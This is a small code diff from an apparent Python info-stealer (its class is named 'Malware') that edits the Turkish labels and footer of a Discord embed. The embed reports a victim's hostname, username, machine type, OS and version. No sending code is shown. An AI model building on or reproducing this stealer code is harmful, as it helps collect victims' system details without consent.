@@ -87,7 +87,7 @@ class Malware:
                 "title": "<a:pinkcrown:996004209667346442> Basit sistem bilgileri:",
                 "color": 0xE53935,
                 "fields": [
-                    {"name": "Ana makine adı:", "value": f"```{socket.gethostname()}```", "inline": True},
+                    {"name": "Ana makine adi:", "value": f"```{socket.gethostname()}```", "inline": True},
                     {"name": "Isim:", "value": f"```{getpass.getuser()}```", "inline": True},
                     {"name": "Makine:", "value": f"```{platform.machine()}```", "inline": True},
                     {"name": "Sistem:", "value": f"```{platform.system()}```", "inline": True},
@@ -95,7 +95,7 @@ class Malware:
                     {"name": "Versiyon:", "value": f"```{platform.version()}```", "inline": True},
                 ],
                 "footer": {
-                    "text": "<:Rem:> Im returning by death. | @Croxlv"
+                    "text": "<a:Rem:1511880153146462359> Im returning by death. | @Croxlv"
                 }
             }
 
